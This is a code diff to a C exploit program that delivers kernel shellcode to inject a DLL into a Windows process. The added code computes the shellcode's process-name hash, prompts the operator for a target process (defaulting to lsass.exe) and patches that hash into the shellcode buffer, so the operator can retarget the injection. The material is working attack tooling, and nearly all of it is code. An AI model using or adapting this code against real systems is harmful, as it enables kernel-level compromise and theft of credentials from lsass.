@@ -353,6 +353,30 @@ void hexDump(char* desc, void* addr, int len)
 	printf("  %s\n", buff);
 }
 
+uint32_t hash_calculator(const char* name) {
+	uint32_t eax = 0;
+	size_t esi = 0;
+
+	while (1) {
+		uint32_t edi = eax;
+
+		edi = (edi << 7);   // shl edi, 7
+		edi = (edi - eax);  // sub edi, eax  -> edi = eax * 127
+		eax = edi;
+
+		if (name[esi] == '\0') {
+			break;
+		}
+
+		uint32_t ecx = (unsigned char)name[esi];
+
+		eax += ecx;
+		esi++;
+	}
+
+	return eax;
+}
+
 unsigned char recvbuff[2048];
 int main(int argc, char* argv[])
 {
@@ -505,6 +529,39 @@ int main(int argc, char* argv[])
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF86] = 1;
 	//printf("AFTER:  ");
 	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
+
+	char process_name[256];
+	printf("Enter process name to inject DLL into (or press Enter to skip): ");
+	
+	if (fgets(process_name, sizeof(process_name), stdin) != NULL) {
+	
+		// User only pressed Enter
+		if (process_name[0] == '\n') {
+			printf("Skipping...default process selected for DLL injection is lsass.exe\n");
+		}
+		else {
+			// Remove trailing newline
+			process_name[strcspn(process_name, "\n")] = '\0';
+	
+			// Convert entire string to lowercase
+			for (int i = 0; process_name[i] != '\0'; i++) {
+				process_name[i] = (char)tolower((unsigned char)process_name[i]);
+			}
+	
+			uint32_t returned_hash = hash_calculator(process_name);
+			printf("%s -> 0x%08X\n", process_name, hash_calculator(process_name));
+
+			printf("Current process hash in the kernel shellcode (lsass.exe):  ");
+			hexDump(NULL, (char*)&kernel_rundll_shellcode[0x862], 4);
+			
+			printf("Patching value in kernel shellcode...\n");
+			*(DWORD*)&kernel_rundll_shellcode[0x862] = returned_hash;
+	
+			printf("Patched value in kernel shellcode:  \n");
+			hexDump(NULL, (char*)&kernel_rundll_shellcode[0x862], 4);
+		}
+	}
+	
 
 	int kernel_shellcode_size = sizeof(kernel_rundll_shellcode) / sizeof(kernel_rundll_shellcode[0]);
 	kernel_shellcode_size -= 1;
